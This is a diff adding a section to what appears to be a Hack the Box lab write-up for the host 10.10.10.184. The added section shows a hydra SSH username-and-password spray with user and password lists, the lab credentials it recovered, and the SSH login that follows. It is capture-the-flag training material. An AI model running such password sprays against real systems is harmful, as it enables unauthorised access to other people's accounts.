@@ -256,3 +256,21 @@ L1k3B1gBut7s@W0rk
 IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
+
+SSH Username and Password Spray
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/886b08d3-aef1-40f5-bf93-8c6b3efc81e8)
+```CSS
+hydra -L users.txt -P passwords.txt ssh://10.10.10.184
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b4fa2700-146f-4e33-b732-8635f0fbfad1)
+```CSS
+SSH Credentials:
+----------------
+nadine:L1k3B1gBut7s@W0rk
+```
+
+SSH Login
+```CSS
+ssh nadine@10.10.10.184
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6c90d7c4-1e86-4b71-834b-2cf12ebcb511)
